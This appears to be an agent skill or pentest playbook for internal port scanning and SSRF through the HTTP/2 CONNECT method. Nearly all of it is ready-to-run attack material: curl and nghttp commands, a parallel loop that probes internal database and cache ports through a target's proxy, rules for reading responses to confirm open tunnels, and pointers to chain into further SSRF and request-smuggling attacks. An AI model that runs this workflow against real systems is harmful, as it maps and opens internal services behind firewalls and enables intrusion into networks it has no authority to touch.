---
name: h2-connect-internal-scan
description: Internal port scanning and SSRF via HTTP/2 CONNECT method -- enumerates internal services, detects open ports, and bypasses firewall restrictions. Use when target supports HTTP/2 and proxies may forward CONNECT requests to internal hosts.
---

# HTTP/2 CONNECT Internal Scan

## Pattern
- Target supports HTTP/2 (ALPN h2 negotiation succeeds)
- Reverse proxy or load balancer in front of application
- CONNECT method not explicitly blocked in H2 stream handlers

## Workflow

### 1. Verify HTTP/2 support
```bash
curl --http2 -v https://target.com 2>&1 | grep "ALPN.*h2"
```

**Checkpoint:** If ALPN negotiation does not show `h2`, fall back to HTTP/1.1 CONNECT or try alternative SSRF vectors.

### 2. Test single CONNECT request
```bash
# Using nghttp2 to send CONNECT to a known-open port
nghttp -v "https://target.com" -H ":method: CONNECT" -H ":authority: 127.0.0.1:80"
```

**Checkpoint:** If RST_STREAM on all attempts, the proxy explicitly blocks CONNECT. Try `te0-request-smuggling` or `ssrf-redirect-loop` instead.

### 3. Scan high-value internal ports
```bash
# Multiplexed port scan via H2 streams
for port in 80 443 3000 5432 6379 8080 8443 9200 11211 27017; do
  nghttp -v "https://target.com" \
    -H ":method: CONNECT" -H ":authority: 127.0.0.1:${port}" \
    2>&1 | grep "status=" &
done
wait
```

High-value ports: 6379 (Redis), 9200 (Elasticsearch), 5432 (Postgres), 27017 (MongoDB), 8080/8443 (internal apps), 3000 (Node), 11211 (Memcached).

### 4. Evaluate responses
- `:status 200` -- open port (tunnel established)
- `:status 502/503` -- port unreachable but CONNECT processed
- `RST_STREAM` -- most reliable closed-port signal

**Checkpoint:** Successful tunnel (status 200) allows sending arbitrary protocol data to internal service. Verify by sending a protocol-specific probe through the tunnel.

## Chain With
- blind-ssrf-chains (exploit discovered internal services)
- te0-request-smuggling (if proxy handles H2, try smuggling variants)

## Reference
https://blog.flomb.net/posts/http2connect/
